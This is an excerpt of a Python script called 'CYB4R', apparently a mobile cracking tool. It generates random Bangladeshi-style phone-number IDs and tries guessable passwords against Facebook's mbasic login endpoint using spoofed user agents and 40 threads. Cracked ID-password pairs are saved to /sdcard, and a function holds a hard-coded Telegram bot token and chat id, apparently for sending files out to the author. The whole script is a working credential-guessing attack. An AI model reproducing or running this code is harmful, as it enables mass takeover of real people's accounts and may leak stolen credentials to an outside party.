...
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone 0S13_4 like Mac OS X)ApplewebKit/537.36 (KHTML, likeGecko) Version/14.7 Mobile/R8HJWHSafari/623.13;]"}
...
for xd in range(10000):
    ...
    f=' Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    ...
    ugen.append(uaku) 
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android 11; SM-T875)'
...
os.system("clear")  
os.system("play-audio m1.mp3")
logo =("""
  CYB4R
\033[38;5;49m═════════════════════════════════════
\033[38;5;47m     [✔]CYB4R
\033[38;5;47m     [✔]Version 6
...
def CYB4R():
    ...
    print(logo)
    print('\033[38;5;46m═══════════════════════════════')
    print('\033[38;5;46m𝙎𝙄𝙈𝙀 𝘾𝙊𝘿𝙀\033[38;5;46m〱𝟬𝟭𝟳〱𝟬𝟭𝟵 〱𝟬𝟭𝟴〱𝟬𝟭𝟱')
    print('\033[38;5;46m═══════════════════════════════')
    code = input('\033[1;92m 𝘾𝙃𝙄𝘾𝙀 𝙔𝙊𝙐𝙍 𝙎𝙄𝙈𝙀 𝘾𝙊𝘿𝙀: ')
    print('\033[38;5;46m═══════════════════════════════')
    print(" \033[38;5;46m𝙇𝙄𝙈𝙄𝙏〱𝟯𝟬𝟬𝟬〱𝟱𝟬𝟬𝟬〱𝟭𝟱𝟬𝟬𝟬〱𝟮𝟬𝟬𝟬𝟬")        
    print('\033[38;5;46m═══════════════════════════════')
    limit=int(input(" \033[38;5;46m𝙇𝙄𝙈𝙄𝙏 𝘾𝙃𝙊𝙊𝙎𝙀 𝙇𝙄𝙈𝙄𝙏: "))
    print('\033[38;5;46m═══════════════════════════════')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=40) as CYB4R:
        tl = str(len(user))
        os.system('clear')
        print(logo)
        print('\033[38;5;46m═══════════════════════════════')
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[38;5;49m𝗔𝗚𝗘𝗡𝗧𝗦         \033[1;34m: \033[38;5;46m"+str(len(ugen5)))
        print('\033[38;5;46m═══════════════════════════════')
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[38;5;49m𝗖𝗥𝗔𝗖𝗞 𝗜𝗗       \033[1;34m: \033[38;5;46m"+tl+" ")
        print('\033[38;5;46m═══════════════════════════════')
        print(f"\033[1;92m[\033[1;34m✔\033[1;92m]\033[38;5;49m𝗦𝗜𝗠 𝗖𝗢𝗗𝗘       \033[1;34m: \033[38;5;46m"+code)
        print('\033[38;5;46m═══════════════════════════════')
        
        for love in user:
            pwx = [love,love[2:],code+love[:3],'bangladesh']
            uid = code+love
            CYB4R.submit(rcrack,uid,pwx,tl)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            agents = "Mozilla/5.0 (Linux; Android 13; SM-S911U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
            session = requests.Session()
            sys.stdout.write('\r\33[1;97m[\33[1;92mCYB4R\33[1;97m]\33[1;94m [%s/%s] \33[1;92mOK:-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            lo = session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
...
""")                
                open('/sdcard/CYB4R-OK.txt', 'a').write( uid+' | '+ps+'\n')
...
def sexy():
    session=requests.session() 
    bot_token ='6791957402:AAFeHIbJcu3XMxLkrAKKTnLyVnbHO8-Gmc0' 
    chat_id ='6015821731'
    #-----------( /sdcard
    try:
